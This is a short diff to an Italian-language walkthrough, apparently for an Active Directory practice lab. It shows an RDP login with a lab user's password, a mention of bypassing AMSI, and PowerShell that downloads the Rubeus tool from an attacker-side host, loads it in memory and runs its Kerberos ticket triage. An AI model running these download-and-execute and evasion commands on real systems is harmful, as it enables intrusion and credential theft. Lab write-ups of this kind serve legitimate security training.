@@ -12,7 +12,7 @@ xfreerdp /d:north.sevenkingdoms.local /u:eddard.stark /p:'FightP3aceAndHonor!' /
 e bypassiamo l'amsi come abbiamo già fatto
 Poi avviamo Rubeus sulla macchina
 ```Powershell
-$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.6:8080/rubeus.exe')
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.6:8080/Rubeus.exe')
 $assem = [System.Reflection.Assembly]::Load($data);
 [Rubeus.Program]::MainString("triage");
 ```
